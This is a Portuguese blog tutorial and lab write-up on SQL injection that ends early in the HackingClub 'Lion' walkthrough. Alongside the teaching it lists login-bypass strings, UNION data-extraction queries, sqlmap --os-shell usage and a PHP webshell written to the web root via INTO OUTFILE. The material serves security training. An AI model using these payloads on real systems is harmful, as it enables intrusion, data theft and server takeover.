---
title: "SQL Injection da teoria à prática com a máquina Lion do Hacking Club"
description: "Guia completo e didático de SQL Injection com teoria, técnicas, exemplos, explorações e resolvendo passo-a-passo máquinas do HackingClub, incluíndo a máquina Lion."
author: matheus
date: 2025-12-06 12:00:00 -0300
last_modified_at: 2026-01-02 20:00:00 -0300
tags: ["SQL Injection", "web security", "pentesting", "RCE", "writeup", "Privilege Escalation", "HackingClub", "Manual Exploitation", "Deep Dive"]
categories: ["SecLab", "WayOfSec", "Hacking", "Write Ups"]
pin: false
comments: true
math: true
---

# A "velha guarda" que ainda tem força para afetar "vibe sistemas" 

O SQL Injection (SQLi) é uma falha jurássica, mas que insiste em não ser extinta. Pelo contrário, ela ameaça voltar com força total em micro-sistemas modernos. O motivo é frustrante, mas real: temos uma geração inteira de "pseudo-desenvolvedores" e "vibe coders" que aprenderam a usar frameworks complexos e/ou agentes de IA para programar, mas não fazem a menor ideia de como a aplicação conversa com o banco de dados nos bastidores. Eles constroem castelos digitais em cima de areia, ignorando os fundamentos básicos de como uma *query* é estruturada, criando brechas críticas por pura ignorância.

Se você acha que SQL Injection é apenas "jogar uma aspa num formulário" e rezar para algo acontecer, ou se a sopa de letrinhas técnica te assusta, pare tudo agora. Este guia completo pode te ajudar. Nele vamos tentar construir esse conhecimento juntos partindo da teoria e indo para a prática com máquinas do Hacking Club. 

Vamos entender a anatomia interna de um banco de dados, ver o cenário do código PHP que causa o problema, entender o arsenal de comandos essenciais e, por fim, aplicar tudo isso para destruir a máquina **Lion** do Hacking Club, do reconhecimento inicial até escalação de privilégio como root, sem pular nenhuma etapa de raciocínio.

---

## Sumário

1. [O Alicerce - Entendendo o Inimigo](#parte-1-o-alicerce---entendendo-o-inimigo-sql-e-banco-de-dados)
2. [A Anatomia da Injeção](#parte-2-a-anatomia-da-injeção-do-cenário-ao-código)
3. [Tipos de SQL Injection](#parte-3-tipos-de-sql-injection)
4. [Conceitos Avançados e Ferramentas](#parte-4-conceitos-avançados-e-ferramentas)
5. [Laboratórios de Treino](#parte-5-laboratórios-de-treino-prática-passo-a-passo)
6. [O Desafio LION - WriteUp Completo](#parte-6-o-desafio-lion---writeup-completo-e-detalhado)
7. [Prevenção e Mitigação](#parte-7-prevenção-e-mitigação)
8. [Conclusão](#conclusão)

---

## Parte 1: O Alicerce - Entendendo o Inimigo (SQL e Banco de Dados)

Antes de tentar quebrar a segurança, você precisa entender profundamente o que está atacando. É como tentar abrir uma fechadura sem saber como ela funciona - até dá pra tentar, mas você vai ficar ali horas tentando na sorte. Então vamos entender essa fechadura primeiro.

O **SQL** (*Structured Query Language*) é a língua universal que usamos para dar ordens a bancos de dados relacionais. Para desmistificar isso de vez, pense num banco de dados não como uma caixa preta complexa, mas como uma **planilha gigante do Excel**. Sério, essa analogia funciona muito bem:

- **Banco de dados** = O arquivo do Excel em si (o `.xlsx`)
- **Tabelas** = As abas da planilha (uma aba para `usuarios`, outra para `produtos`, etc.)
- **Colunas** = Os cabeçalhos como `nome`, `senha`, `preço`
- **Linhas** = Cada registro individual (o usuário "admin" com todos os seus dados ocupa uma linha)

Quando você entra numa loja virtual e busca por "Mouse", o seu navegador não fala diretamente com o banco de dados. Ele fala com o **Backend** (o código rodando no servidor em PHP, Python, Java, etc.). O Backend é quem monta uma frase (chamada de **Query**) e a envia para o Banco de Dados. O Banco, por sua vez, obedece cegamente a essa ordem e devolve os dados para o site. E é exatamente aqui que mora o perigo: se a gente conseguir manipular essa "frase", conseguimos fazer o banco obedecer comandos que não eram para existir.

### O Arsenal: Comandos Essenciais Explicados

Para navegar e extrair dados de um banco, você precisa ter fluência em alguns comandos nativos do SQL. Não precisa decorar tudo agora - com a prática isso fica natural -, mas é bom ter essa referência.

O comando mais básico é o **SELECT**, que serve para leitura. É a forma de dizer "Ei, me mostre tal coisa". Geralmente ele vem acompanhado do **WHERE**, que atua como um filtro essencial. Sem ele, o banco devolveria milhões de linhas de uma vez; com ele, filtramos apenas o que queremos, como `WHERE id = 10`.

Além do básico, um atacante precisa conhecer as funções de reconhecimento do sistema:

| Função/Comando | O que faz | Por que é útil |
|----------------|-----------|----------------|
| `database()` | Retorna nome do banco atual | Saber onde estamos pisando |
| `user()` | Mostra usuário da conexão | Se for `root`, jackpot! |
| `@@version` | Versão do MySQL/MariaDB | Buscar vulns específicas da versão |
| `@@hostname` | Nome do servidor | Reconhecimento do ambiente |
| `@@datadir` | Diretório dos dados | Útil para INTO OUTFILE |

Outro conceito fundamental é a **concatenação de dados**. Muitas vezes, queremos extrair o usuário e a senha numa única linha para facilitar a visualização. Para isso usamos funções como `concat()` ou `group_concat()`, que juntam valores de colunas diferentes (como `user` e `pass`) em uma única string, geralmente separadas por um caractere que escolhemos, como dois pontos (`::`). 

E, claro, temos o **information_schema**, que é um banco de dados padrão do MySQL que funciona como um índice mestre. Dentro dele, existem tabelas chamadas `TABLES` e `COLUMNS` que listam os nomes de **todas** as tabelas e colunas de todo o sistema. É assim que descobrimos nomes de tabelas secretas sem nunca tê-las visto antes. Pense nele como o "mapa do tesouro" de todo o sistema.

### Cenário e Comandos: Entendendo SQL na Prática

Com o que vimos até aqui, podemos relembrar de alguns conceitos e mostrar, assim, os comandos práticos de banco SQL. Imagina que você tem uma loja online. Você precisa guardar informações sobre produtos: nome, preço, descrição, etc. No banco, isso pode ser uma tabela chamada "produtos", organizada em colunas como "id" (identificação numérica exclusiva de cada um), "nome", "preco", "descricao". Seguindo nesse sentido, podemos entender que cada produto é uma linha nessa tabela.

Os comandos básicos do SQL até que são simples. Para ver tudo de uma tabela:

```sql
SELECT * FROM produtos;
```

O asterisco (`*`) é um curinga que significa "todas as colunas". Isso pega todas as linhas e colunas da tabela "produtos". Agora, se quisermos FILTRAR para vermos somente os nomes e preços dos produtos que custam mais de 100 reais:

```sql
SELECT nome, preco FROM produtos WHERE preco > 100;
```

Caso queira complementar a tabela e adicionar um novo produto:

```sql
INSERT INTO produtos (nome, preco) VALUES ('Mouse', 49.90);
```

Para alterar o preço de um produto específico:

```sql
UPDATE produtos SET preco = 39.90 WHERE nome = 'Mouse';
```

Provavelmente, terá situações que iria preferir alterar via ID e não pelo NOME, visto que vários produtos diferentes poderiam ter nomes iguais ou similares.

Agora, para apagar algum produto da tabela:

```sql
DELETE FROM produtos WHERE nome = 'Mouse';
```

O importante aqui é entender que esses comandos são executados no **backend**, ou seja, no servidor, quando você interage com um site. Quando você faz login, busca por um produto, ou cadastra algo, o site monta uma query SQL e manda pro banco executar tal ação.

Agora, o problema surge quando o site não trata direito o que você, como um usuário/client, digita. Se o desenvolvedor simplesmente "cola" o que você escreveu dentro da query, sem verificar nada ou limpar, você pode "injetar" comandos SQL extras. É daí que vem o nome: **SQL Injection**.

---

## Parte 2: A Anatomia da Injeção (Do Cenário ao Código)

Agora que entendemos a linguagem, vamos entender a falha. O problema técnico surge quando o desenvolvedor preguiçoso (ou ignorante) confia no usuário. E olha, nunca confie no input do usuário - essa é a regra número um de segurança em desenvolvimento.

### O Cenário de Busca

Imagine que você está num site de e-commerce com uma barra de pesquisa. O desenvolvedor espera que você digite o nome de um produto, como "Mouse". Nos bastidores, ele pega essa palavra e a concatena dentro de uma frase SQL para buscar no banco. Até aí, tudo bem, se todo mundo fosse honesto.

Então, quando o usuário digita "Mouse" na busca, o backend monta a query assim:

```sql
SELECT * FROM produtos WHERE nome LIKE '%Mouse%';
```

> O **LIKE** com **%** significa "qualquer coisa antes ou depois de *Mouse*". É o famoso "contém".

### O Código Vulnerável (A Cena do Crime)

Veja como um desenvolvedor ignorante em relação a SQLi (ou um "vibe coder" apressado) escreveria esse sistema de busca em PHP:

```php
<?php
$pesquisa = $_POST['busca'];
// O ERRO FATAL: Ele cola a variável $pesquisa direto na string SQL sem limpar nada
$query = "SELECT * FROM produtos WHERE nome LIKE '%" . $pesquisa . "%'";
$resultado = $banco->query($query);
?>
```

> Parece certo pela lógica de programação, mas não parece certo pela lógica de segurança.

O erro aqui é a falta de **Sanitização**. O código não verifica se o usuário digitou comandos SQL, aspas ou caracteres especiais. Ele simplesmente **aceita tudo** que vier do input do client sem tratamentos ou filtros. A forma correta de fazer isso seria usar *Prepared Statements* (também conhecidos como *Parameterized Queries*), onde o banco trata a entrada do usuário estritamente como texto, e nunca como comando executável. Mas isso fica pra parte de prevenção.

### A Injeção na Prática

Sabendo que o código é vulnerável, se digitarmos `' OR 1=1 --` na barra de pesquisa, a query que chega no banco se transforma nisso:

```sql
SELECT * FROM produtos WHERE nome LIKE '%' OR 1=1 --%'
```

Vamos dissecar o que aconteceu aqui, passo a passo:

1. **A aspa simples (`'`)** - Fechou a string de texto que o programador abriu. A partir daqui, o banco para de interpretar como texto e começa a interpretar como comando SQL.

2. **`OR 1=1`** - Inserimos uma condição que é uma verdade matemática absoluta. Como `1=1` é sempre verdadeiro, a condição `WHERE` se torna verdadeira para **todas** as linhas da tabela. O banco ignora se o nome do produto bate ou não.

3. **`--` (dois traços)** - Isso é um comentário em SQL. Tudo o que vem depois é ignorado. Serve para "anular" o resto da query original (aquele `%'` que sobraria) e evitar erros de sintaxe.

O banco lê: "Me dê todos os produtos onde o nome contém vazio OU onde 1 é igual a 1". Como 1=1 é sempre verdade, ele entrega o banco inteiro para você.

### Variações de Comentários SQL

Dependendo do banco de dados, os comentários funcionam de formas diferentes:

| Banco | Comentário de Linha | Comentário de Bloco |
|-------|---------------------|---------------------|
| MySQL | `--` (com espaço) ou `#` | `/* */` |
| PostgreSQL | `--` | `/* */` |
| MSSQL | `--` | `/* */` |
| Oracle | `--` | `/* */` |

Por isso você vai ver payloads terminando em `-- -` (dois traços, espaço, traço), `--+` (o + vira espaço em URL encoding), ou simplesmente `#`. Tudo depende do contexto.

### Levando o Conceito para o Bypass de Login

Agora, vamos aplicar essa mesma lógica num formulário de login. Se você entendeu a injeção na busca, o login é intuitivo. O código SQL por trás de um login geralmente verifica se o usuário E a senha batem:

```sql
SELECT * FROM usuarios WHERE username = '$user' AND password = '$password';
```

Se você digitar no campo de usuário: `admin' --`

A query final se transforma nesta aberração:

```sql
SELECT * FROM usuarios WHERE username = 'admin' --' AND password = '...';
```

O traço duplo (`--`) diz ao banco: "Ignore tudo o que vem depois daqui". Consequentemente, a parte `AND password = ...` é simplesmente apagada da lógica. O banco lê apenas "Selecione o usuário admin". O sistema loga você como administrador sem nunca verificar a senha. É um xeque-mate lógico.

**Outras variações clássicas de bypass de login:**

```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
') OR ('1'='1
') OR ('1'='1'--
```

A ideia é sempre a mesma: fechar a string, inserir uma condição verdadeira ou comentar o resto. A variação depende de como o código foi escrito e qual banco está por trás.

---

## Parte 3: Tipos de SQL Injection

Nem todo SQLi é igual. Dependendo de como a aplicação responde (ou não responde) às nossas injeções, precisamos usar técnicas diferentes. É como tentar abrir portas diferentes - algumas mostram claramente se estão trancadas, outras você precisa ficar ouvindo o barulho da fechadura.

### In-Band SQLi (O Mais Comum)

É quando conseguimos ver o resultado da nossa injeção diretamente na página. É o tipo mais fácil de explorar porque o feedback é imediato.

**Error-Based:** A aplicação mostra erros do banco na tela. Isso é ouro porque os erros frequentemente vazam informações como nomes de tabelas, colunas e até dados. Se você vê algo como `You have an error in your SQL syntax...`, é sinal de que a aplicação está vulnerável e te dando feedback.

**Union-Based:** Usamos o comando `UNION` para "colar" nossos dados junto com os dados legítimos. É o que mais vamos usar nos exemplos práticos.

### Blind SQLi (O Mais Trabalhoso)

Quando a aplicação não mostra erro nem dados, mas ainda está vulnerável. Precisamos fazer perguntas de "sim ou não" e observar mudanças sutis no comportamento.

**Boolean-Based:** A página muda de alguma forma dependendo se a condição é verdadeira ou falsa. Por exemplo:
- Se `' AND 1=1 --` mostra a página normalmente
- E `' AND 1=2 --` mostra uma página diferente (vazia, erro genérico, etc.)
- Então está vulnerável!

Podemos extrair dados letra por letra fazendo perguntas como: "A primeira letra do nome do banco é 'a'?", "É 'b'?", "É 'c'?"... Trabalhoso, mas funciona.

```sql
' AND SUBSTRING(database(),1,1)='a' --
' AND SUBSTRING(database(),1,1)='b' --
-- e assim por diante...
```

**Time-Based:** A página não muda visualmente, mas podemos fazer o banco "dormir" e medir o tempo de resposta:

```sql
' AND SLEEP(5) --
```

Se a página demorar 5 segundos pra carregar, está vulnerável. Daí fazemos:

```sql
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
```

Se demorar 5 segundos, a primeira letra é 'a'. Se responder rápido, não é. É doloroso de fazer manualmente, mas ferramentas como SQLMap automatizam isso.

### Out-of-Band SQLi (O Mais Raro)

Quando não conseguimos ver resultados na página e nem medir tempo, mas conseguimos fazer o servidor enviar dados pra outro lugar (tipo um servidor nosso). Isso depende de funcionalidades específicas habilitadas no banco, como o `xp_dirtree` no MSSQL ou `LOAD_FILE` no MySQL. É menos comum, mas quando funciona, é poderoso.

---

## Parte 4: Conceitos Avançados e Ferramentas

Antes de entrarmos nos laboratórios, precisamos aprofundar em conceitos que serão vitais para a resolução das máquinas.

### O Poder do UNION (A "Cola" de Tabelas)

O comando **UNION** é a arma nuclear do atacante para extrair dados. Para entender bem, vou usar uma analogia:

**Analogia do Formulário:**

Imagine que você trabalha no RH de uma empresa e tem acesso a um sistema que só gera relatórios de funcionários com 3 campos fixos: `Nome`, `Cargo` e `Departamento`. Você não tem acesso ao módulo financeiro que mostra salários.

Agora imagine que você descobre uma brecha: o sistema permite "juntar" dados de outras tabelas no mesmo relatório, desde que você respeite o formato de 3 campos. É como se você dissesse: "me mostra os funcionários do TI, **E TAMBÉM** (`UNION`) junta nesse mesmo relatório os dados da tabela de salários".

O pulo do gato: você precisa "encaixar" os dados de salário no mesmo formato de 3 campos. Então você coloca: `NomeFuncionario`, `Salario`, `DataPagamento`. Se tentar colocar 4 campos onde o sistema espera 3, dá erro.

**O que o UNION realmente faz:**

Tecnicamente, o `UNION` combina o resultado de dois `SELECT` diferentes em uma única saída. É como colar duas planilhas uma embaixo da outra. A query original do site retorna dados legítimos (produtos, notícias, etc.), e nós "colamos" embaixo dados que queremos roubar (senhas, emails, etc.).

```sql
-- Query original do site (retorna produtos)
SELECT nome, descricao, preco FROM produtos WHERE categoria = 'eletronicos'

-- O que injetamos com UNION (retorna usuários!)
UNION SELECT username, password, email FROM usuarios
```

O resultado final é uma "tabela combinada" onde as primeiras linhas são produtos legítimos e as últimas linhas são os dados roubados.

**A Regra de Ouro que derruba iniciantes:**

Para o `UNION` funcionar, a sua consulta injetada precisa ter **exatamente o mesmo número de colunas** da consulta original do site. Se o site pede 3 colunas (`nome`, `descrição`, `preço`) e você tenta injetar 4 colunas (`1`, `2`, `3`, `4`), o banco dá um erro fatal e a página quebra ou fica branca.

É por isso que, antes de qualquer extração de dados, passamos uma fase de **reconhecimento** para descobrir quantas colunas a query original tem.

#### Descobrindo o Número de Colunas

Existem duas técnicas principais. Geralmente usamos o ORDER BY primeiro (mais rápido) e confirmamos com UNION SELECT depois.

**Método 1: ORDER BY (Mais Rápido)**

O comando `ORDER BY` serve para ordenar resultados por uma coluna específica. O truque é: você pode especificar a coluna pelo **número da posição** em vez do nome. Se você pedir `ORDER BY 5` mas a query só tem 3 colunas, o banco retorna erro.

```sql
' ORDER BY 1 --    -- Funciona? Tem pelo menos 1 coluna
' ORDER BY 2 --    -- Funciona? Tem pelo menos 2 colunas  
' ORDER BY 3 --    -- Funciona? Tem pelo menos 3 colunas
' ORDER BY 4 --    -- Erro? Então são exatamente 3 colunas!
```

**Por que isso funciona?**

Quando você injeta `' ORDER BY 3 --`, a query completa fica algo como:
```sql
SELECT nome, descricao, preco FROM produtos WHERE nome LIKE '%' ORDER BY 3 -- %'
```

O banco lê: "ordene pelo terceiro campo". Se existem 3 campos, funciona. Se você pedir `ORDER BY 4` e só existem 3, o banco reclama: "Coluna 4 não existe".

**Dica de eficiência:** Não precisa ir de 1 em 1. Comece testando números maiores (5, 10, 15) pra ter uma noção, depois faça busca binária. Se `ORDER BY 10` dá erro mas `ORDER BY 5` funciona, a resposta está entre 5 e 10.

**Método 2: UNION SELECT (Confirmação)**

Depois de descobrir o número aproximado com ORDER BY, confirmamos com UNION SELECT:

```sql
' UNION SELECT 1 --           -- Erro (precisa de mais colunas)
' UNION SELECT 1,2 --         -- Erro (ainda faltam)
' UNION SELECT 1,2,3 --       -- Funciona! Confirmado: 3 colunas
```

**O Truque dos Números "Marcadores":**

Quando injetamos `' UNION SELECT 1,2,3 --`, estamos literalmente pedindo pro banco retornar os números 1, 2 e 3 como se fossem dados. Esses números vão aparecer na página no lugar onde normalmente apareceriam nome, descrição e preço dos produtos.

**E aqui está a sacada:** nem todas as colunas são exibidas na página! O site pode ter 7 colunas na query, mas só mostrar 3 delas pro usuário. Quando você vê que apenas os números 2, 4 e 6 aparecem na tela (e 1, 3, 5, 7 não), você sabe que as colunas "visíveis" são a 2ª, 4ª e 6ª.

Isso é crucial porque você só consegue ver dados extraídos se injetar nas colunas visíveis. Se você colocar `database()` na coluna 1 mas ela não é exibida, não vai ver o resultado. Precisa colocar na coluna 2, 4 ou 6.

#### Por que o resultado aparece naquela posição específica?

Quando você acessa uma página de busca, o HTML dela tem "espaços reservados" onde os dados do banco são inseridos. Por exemplo:

```html
<div class="produto">
  <h2><?php echo $row['nome']; ?></h2>      <!-- Coluna 1 -->
  <p><?php echo $row['descricao']; ?></p>   <!-- Coluna 2 -->
  <span><?php echo $row['preco']; ?></span> <!-- Coluna 3 -->
</div>
```

Quando você injeta `' UNION SELECT 111,222,333 --`, o banco retorna uma "linha falsa" com os valores 111, 222 e 333. O PHP pega esses valores e coloca nos mesmos lugares onde colocaria dados reais:

- O número `111` aparece onde deveria estar o nome do produto
- O número `222` aparece onde deveria estar a descrição
- O número `333` aparece onde deveria estar o preço

**Então, lembrando:** nem sempre todas as colunas da query são exibidas! O desenvolvedor pode fazer `SELECT *` (que pega todas as colunas) mas só exibir algumas no HTML. As colunas que ele não exibe são "invisíveis" pra gente - por isso usamos números como marcadores, pra descobrir quais posições aparecem na tela.

### Extraindo Dados com information_schema

Com o número de colunas descoberto, a diversão começa. O `information_schema` é nosso mapa do tesouro. 

**Descobrir nome das tabelas:**
```sql
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = database() --
```

**Descobrir colunas de uma tabela específica:**
```sql
' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 'usuarios' --
```

**Extrair dados da tabela:**
```sql
' UNION SELECT 1, concat(username,'::',password), 3 FROM usuarios --
```

O `concat()` junta os valores com `::` no meio pra facilitar a leitura. Se tiver muitos registros, use `group_concat()` pra trazer todos numa linha só.

### Webshell e RCE (O Controle Remoto)

Muitas vezes, ler o banco de dados não é suficiente; queremos controlar o servidor. Uma **Webshell** é um pequeno script (geralmente em PHP) que funciona como um terminal via navegador. O código clássico é:

```php
<?php system($_GET['cmd']); ?>
```

Quando gravamos esse arquivo no servidor, podemos passar comandos de sistema operacional (como `ls`, `cat`, `whoami`) através da URL, e o servidor os executa:

```
http://site.com/shell.php?cmd=whoami
```

Isso se chama **RCE** (Remote Code Execution) e é o "Santo Graal" de uma invasão web. Do SQLi para o RCE, escalamos de "conseguir ler dados" para "conseguir executar qualquer coisa no servidor".

### INTO OUTFILE: Escrevendo Arquivos via SQLi

O comando **INTO OUTFILE** do MySQL permite salvar o resultado de um SELECT em um arquivo no servidor. Se tivermos permissão de escrita (e geralmente pastas como `/var/www/html/uploads/` têm), podemos criar nossa webshell:

```sql
' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3 INTO OUTFILE "/var/www/html/shell.php" --
```

**Pré-requisitos para funcionar:**
1. O usuário do banco precisa ter privilégio `FILE`
2. A variável `secure_file_priv` precisa permitir escrita naquele diretório
3. O diretório precisa ter permissão de escrita para o usuário do MySQL

Nem sempre funciona, mas quando funciona, é game over.

### Enumeração e Fuzzing (Descobrindo o Invisível)

Para achar onde gravar nossa webshell, precisamos conhecer a estrutura de pastas do site. Como o servidor não nos mostra tudo, usamos a técnica de **Fuzzing**. Ferramentas como `ffuf`, `gobuster` ou `dirbuster` bombardeiam o site com milhares de nomes comuns de diretórios e analisam a resposta:

```bash
ffuf -u http://alvo.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Se o site responder com código 200 (OK) ou até 403 (Forbidden), sabemos que a pasta existe. Códigos 404 indicam que não existe.

**Diretórios comuns que vale testar:**
- `/admin`, `/administrator`, `/login`
- `/uploads`, `/upload`, `/files`
- `/includes`, `/inc`, `/assets`
- `/backup`, `/bkp`, `/old`
- `/api`, `/v1`, `/v2`

### SQLMap: Automatizando a Exploração

Fazer tudo manualmente é ótimo pra aprender, mas em cenários reais a gente usa ferramentas. O **SQLMap** é o canivete suíço do SQL Injection - ele detecta, explora e extrai dados automaticamente.

**Uso básico:**
```bash
sqlmap -u "http://site.com/busca.php?id=1" --dbs
```

**Parâmetros úteis:**
```bash
# Detectar e listar bancos de dados
sqlmap -u "URL" --dbs

# Listar tabelas de um banco específico
sqlmap -u "URL" -D nome_banco --tables

# Listar colunas de uma tabela
sqlmap -u "URL" -D nome_banco -T nome_tabela --columns

# Extrair dados (dump)
sqlmap -u "URL" -D nome_banco -T nome_tabela --dump

# Tentar conseguir uma shell
sqlmap -u "URL" --os-shell

# Para requisições POST
sqlmap -u "URL" --data="usuario=admin&senha=123" -p usuario
```

**Dicas importantes:**
- Use `--batch` pra ele não ficar perguntando coisas
- Use `--risk=3 --level=5` pra testes mais agressivos
- Use `--tamper=space2comment` se tiver WAF bloqueando
- Use `-r request.txt` pra importar uma requisição do Burp Suite

O SQLMap é poderoso, mas barulhento. Em ambientes reais com WAF (Web Application Firewall), você pode precisar de técnicas manuais e criativas, então é melhor treinar o manual primeiro.

---

## Parte 5: Laboratórios de Treino (Prática Passo a Passo)

Agora vamos afiar as ferramentas nos laboratórios do Hacking Club. O objetivo aqui é fixar a mecânica antes de enfrentar a máquina Lion e qualquer outra de SQLi com RCE e Privilege Escalation. Considere esses labs como "sparring" antes da "luta de verdade".

### Lab 1: Ataque Manual (Extração de Dados)

Neste cenário, temos uma loja virtual vulnerável. Nosso objetivo é encontrar e ler uma "flag" que está numa tabela oculta.

**Passo 1: Confirmar a vulnerabilidade**

Primeiro, testamos se o campo de busca é vulnerável. Digitamos uma aspa simples (`'`) e observamos. Se der erro de SQL ou a página quebrar, é sinal positivo.

**Passo 2: Descobrir número de colunas**

Começamos o processo de descoberta de colunas. Tentamos injetar `' UNION SELECT 1,2,3 --`, mas o site "quebra" e o conteúdo some. Isso nos diz que erramos e que a query original não tem 3 colunas. Tentamos então:

```sql
' UNION SELECT 1,2,3,4 --
```

Sucesso! O site carrega normalmente e vemos os números impressos na tela onde antes havia produtos. Isso confirma que a estrutura possui **4 colunas** e nos mostra quais colunas são visíveis para nós (provavelmente apareceram os números 2 e 3 em algum lugar da página).

**Passo 3: Mapear o banco de dados**

Com o número de colunas definido, partimos para o mapeamento do banco usando o `information_schema`. Injetamos:

```sql
' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema = database() --
```

O site retorna uma lista de tabelas: `products` e `flag`. 

> Encontramos nosso alvo!

**Passo 4: Descobrir as colunas da tabela flag**

Antes de extrair os dados, precisamos saber quais colunas existem na tabela `flag`:

```sql
' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name = 'flag' --
```

Descobrimos que tem colunas `id` e `name`.

**Passo 5: Extrair a flag**

Agora, precisamos extrair o conteúdo da tabela `flag`. Em alguns casos, o site só mostra o primeiro resultado da busca (que seria um produto legítimo). Para contornar isso, usamos um truque: adicionamos uma condição falsa antes do UNION para garantir que a query original não retorne nada. Injetamos:

```sql
' AND 1=2 UNION SELECT 1, id, name, 4 FROM flag --
```

O `AND 1=2` faz a primeira parte da query não retornar nada (porque 1 nunca é igual a 2), então só os dados do nosso UNION aparecem.

O site exibe o conteúdo da tabela: **CS{SQL1_M4nu4l_4tt4ck}**.

### Lab 2: Do SQLi ao RCE (Webshell)

Aqui o desafio sobe de nível. Não queremos apenas ler dados, queremos invadir o servidor criando um arquivo malicioso.

O conceito chave aqui é o comando **INTO OUTFILE**. No MySQL, esse comando permite pegar o resultado de qualquer "select" e salvá-lo num arquivo de texto **dentro do servidor**. Se o servidor tiver uma pasta pública com permissão de escrita (como `/var/www/html` ou uma pasta de uploads), podemos usar isso para criar nossa webshell.

**Passo 1: Verificar permissões**

Antes de tudo, vale verificar se temos o privilégio FILE. Podemos testar com:

```sql
' UNION SELECT 1,2,3,user() --
```

Se aparecer `root@localhost` ou algo parecido, as chances são boas.

**Passo 2: Criar a webshell**

Nosso payload malicioso será o código PHP que explicamos antes: `<?php system($_GET['cmd']); ?>`. Vamos injetar isso como se fosse um dado e mandar salvar no arquivo `shell.php`. A injeção completa fica:

```sql
' UNION SELECT 1, 2, 3, "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php" -- -
```

Se não der erro, o arquivo foi criado.

**Passo 3: Testar a webshell**

Após enviar a injeção, testamos se o arquivo foi criado acessando `/shell.php?cmd=id`. O servidor obedece, executa o comando `id` (que mostra o usuário atual) e nos mostra o resultado no navegador.

Se aparecer algo como `uid=33(www-data) gid=33(www-data)`, funcionou! Conseguimos RCE.

**Passo 4: Ler a flag**

Agora é só usar nossa shell pra ler a flag:

```
/shell.php?cmd=cat /flag.txt
```

Ou listar arquivos com `ls -la /` pra encontrar onde a flag está.

---

## Parte 6: O Desafio LION - WriteUp Completo e Detalhado

Chegamos ao chefão. A máquina Lion é um cenário realista que não te dá dicas. Precisamos enumerar, explorar, pivotar e escalar privilégios. Vou detalhar cada passo do jeito que eu fiz, com os erros e acertos, pra vocês entenderem o raciocínio por trás de cada decisão.

> **Informações da máquina:**
> - IP do alvo: `172.16.0.48`
> - IP da VPN (atacante): `10.0.30.175`

### Fase 1: Enumeração e Reconhecimento

Não começamos atacando; começamos observando. Essa é a regra de ouro de qualquer pentest. Rodamos o **Nmap** pra descobrir o que está rodando na máquina:

```bash
nmap -sC -sV -Pn 172.16.0.48
```

Explicando os parâmetros:
- `-sC` = Scripts padrão de detecção (executa scripts NSE básicos para identificar serviços)
- `-sV` = Detectar versão dos serviços (tenta descobrir qual software e versão está rodando)
- `-Pn` = Não fazer ping antes do scan (útil quando ICMP está bloqueado por firewall)

**Resultado do scan:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.46 (() PHP/7.4.15)
```
<img width="50%" alt="image" src="https://github.com/user-attachments/assets/3f7278d7-4aa5-4e30-89a3-1df50cb958e8" />

Temos um servidor web Apache na porta 80.

Acessando `http://172.16.0.48` no navegador, encontramos um portal de notícias. Antes de sair clicando em tudo (ou enquanto), vamos mapear os diretórios.

<img width="50%" alt="image" src="https://github.com/user-attachments/assets/99d4a758-d0e1-425a-bfbe-51bc1b22ce0f" />

**Fuzzing de diretórios com ffuf:**

```bash
ffuf -u http://172.16.0.48/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c
```

A ideia aqui é descobrir caminhos/diretórios dessa aplicação, que é uma etapa importante de reconhecimento do alvo.

Utilizaremos o `ffuf` para fazer o fuzzing utilizando uma wordlist do dirbuster, pois já temos no nosso Kali e é bem completa.

Coloque o `-u` para o target (<URL>/FUZZ) e o `-w` para a wordlist. Já o `-c` é opcional, gosto de por para colorir a saída e facilitar a visualização.
> Não esquecer de por o `FUZZ` na URL, local onde irá colocar cada elemento da wordlist nos testes.

**Resultado interessante:**
```
admin                   [Status: 301, Size: xxx]
includes                [Status: 301, Size: xxx]
index.php               [Status: 200, Size: xxx]
```

O scan nos retorna dois diretórios interessantes: `/admin` e `/includes`.

<img width="50%" alt="image" src="https://github.com/user-attachments/assets/017ab26e-3c2b-4df1-bfba-58a450e4183e" />

Aqui entra a malícia do atacante. O diretório `/admin` pede login e senha - testamos, mas nada funcionou e nem estou querendo fazer brute force. É um beco sem saída por enquanto.

Porém, o diretório `/includes` brilha aos nossos olhos. Em servidores Apache, pastas com nomes como "includes", "uploads" ou "assets" frequentemente possuem **permissões de escrita (777) mal configuradas** para que o site possa salvar arquivos temporários ou uploads de usuários. Se acessarmos `http://172.16.0.48/includes/` diretamente e conseguirmos ver o conteúdo (ou não recebermos 403 Forbidden), é um bom sinal, então vamos testar:

<img width="30%" alt="image" src="https://github.com/user-attachments/assets/c5c8eb5a-195c-4de2-b8ab-a1eacfb313ad" />

Yep! Guardaremos essa informação com carinho, pois ela pode ser útil como porta de entrada.

### Fase 2: Encontrando o SQLi e Primeira Flag

Voltamos à página principal e começamos a explorar as funcionalidades. Tem uma barra de busca de notícias. 

Pegando o exemplo como este, um portal de notícia, quando um usuário pesquisa por uma delas, este input é processado e colocado numa query que é enviada ao banco, para que ele retorne o resultado de sua pesquisa.

Já falamos sobre pensarmos no banco de dados como uma planilha/tabela de excel padrão que armazena conteúdo da plataforma. Assim sendo, quando você pesquisa algo como "states", está basicamente falando "`Me mande quaisquer resultados de notícia que contenha a palavra 'states'`". Ao testarmos no site, veremos que mostrará notícias relacionadas com a palavra-chave (ao menos em título) na aba de pesquisa.  

Então, a query deve ficar mais ou menos assim (seguirá essa lógica):

```sql
SELECT * FROM news WHERE title LIKE '%states%';
# ou  SELECT title FROM news WHERE title LIKE '%states%';
```

Agora precisamos saber se a gente consegue injetar código neste campo e alterar a query de alguma forma. Geralmente, quando tentamos identificar um SQLi via error, podemos colocar uma aspas simples. Dando erro, o SQLi é certo, já que a query ficaria assim:

```sql
SELECT * FROM news WHERE title LIKE '%'%';
```

Fechou a aspas, mas continuou o restante da query `%';`, o que culminaria em erro de SQL.

